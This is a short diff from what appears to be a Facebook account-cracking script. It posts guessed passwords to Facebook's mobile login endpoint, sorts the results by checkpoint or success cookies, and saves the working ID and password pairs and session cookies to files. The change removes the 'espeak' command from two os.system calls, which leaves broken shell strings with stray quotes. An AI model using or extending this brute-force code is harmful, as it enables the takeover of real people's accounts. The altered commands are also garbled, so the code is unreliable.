@@ -679,7 +679,7 @@ def crackfree(idf,pwv):
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r\033[0;95m[{time.strftime("%H:%M")}•KakTarani💀-Cp] {idf} • {pw}')
-                os.system('espeak -a 300 " Cp,"')
+                os.system('Cp,"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
@@ -689,7 +689,7 @@ def crackfree(idf,pwv):
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r\033[10;92m[{time.strftime("%H:%M")}•KakTarani💀-Ok] {idf} • {pw} ')
-                os.system('espeak -a 300 " Ok,  KakTarani💀,  id"')
+                os.system('Ok,  KakTarani💀,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
